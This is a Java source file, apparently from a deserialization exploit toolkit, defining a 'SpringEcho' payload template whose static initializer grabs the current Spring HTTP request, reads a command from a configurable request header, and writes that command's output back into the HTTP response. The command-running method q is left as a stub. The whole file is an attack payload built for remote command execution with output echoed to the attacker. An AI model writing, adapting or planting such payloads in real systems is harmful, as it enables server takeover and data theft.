package org.su18.ysuserial.payloads.templates.echo;

/**
 * @author su18
 */
public class SpringEcho {

	public static String CMD_HEADER;

	static {
		try {
			org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
			javax.servlet.http.HttpServletRequest                     request           = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
			javax.servlet.http.HttpServletResponse                    response          = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
			String                                                    cmd               = request.getHeader(CMD_HEADER);
			if (cmd != null && !cmd.isEmpty()) {
				response.getWriter().write(new String(q(cmd).toByteArray()));
			}
			response.getWriter().flush();
			response.getWriter().close();
		} catch (Exception ignored) {
		}
	}

	public static java.io.ByteArrayOutputStream q(String cmd) {
		return null;
	}
}
